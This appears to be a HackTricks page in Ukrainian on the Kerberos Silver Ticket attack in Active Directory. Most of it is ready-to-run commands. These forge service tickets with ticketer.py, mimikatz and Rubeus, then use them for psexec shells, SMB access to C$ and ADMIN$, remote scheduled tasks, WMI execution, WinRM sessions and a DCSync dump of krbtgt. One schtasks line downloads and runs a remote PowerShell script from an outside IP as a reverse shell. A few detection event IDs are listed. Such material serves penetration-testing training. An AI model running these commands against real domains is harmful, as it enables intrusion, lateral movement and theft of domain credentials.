# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** передбачає експлуатацію сервісних квитків в середовищах Active Directory (AD). Цей метод базується на **отриманні NTLM хешу облікового запису сервісу**, такого як обліковий запис комп'ютера, для підробки квитка служби надання квитків (TGS). З цим підробленим квитком зловмисник може отримати доступ до конкретних сервісів в мережі, **вдаючи з себе будь-якого користувача**, зазвичай намагаючись отримати адміністративні привілеї. Підкреслюється, що використання AES ключів для підробки квитків є більш безпечним і менш помітним.

Для створення квитків використовуються різні інструменти в залежності від операційної системи:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### На Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS-сервіс виділяється як загальна ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можуть бути використані для завдань і WMI-запитів.

## Доступні сервіси

| Тип сервісу                                | Сервісні срібні квитки                                                    |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>В залежності від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>В деяких випадках ви можете просто запитати: WINRM</p> |
| Заплановані завдання                       | HOST                                                                     |
| Спільний доступ до файлів Windows, також psexec | CIFS                                                                     |
| Операції LDAP, включаючи DCSync           | LDAP                                                                     |
| Інструменти адміністрування віддалених серверів Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| Золоті квитки                             | krbtgt                                                                   |

Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використовуючи параметр:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Ідентифікатори подій срібних квитків

- 4624: Увійшов до облікового запису
- 4634: Вийшов з облікового запису
- 4672: Увійшов адміністратор

## Зловживання сервісними квитками

У наступних прикладах уявімо, що квиток отримано, підробляючи обліковий запис адміністратора.

### CIFS

З цим квитком ви зможете отримати доступ до папок `C$` і `ADMIN$` через **SMB** (якщо вони відкриті) і копіювати файли в частину віддаленої файлової системи, просто зробивши щось на зразок:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ви також зможете отримати оболонку всередині хоста або виконати довільні команди, використовуючи **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### ХОСТ

З цією дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

З цими квитками ви можете **виконати WMI в системі жертви**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Знайдіть **додаткову інформацію про wmiexec** на наступній сторінці:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

З доступом winrm до комп'ютера ви можете **отримати доступ** до нього і навіть отримати PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Перевірте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зверніть увагу, що **winrm має бути активним і слухати** на віддаленому комп'ютері для доступу до нього.

### LDAP

З цією привілеєю ви можете скинути базу даних DC, використовуючи **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Дізнайтеся більше про DCSync** на наступній сторінці:

## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
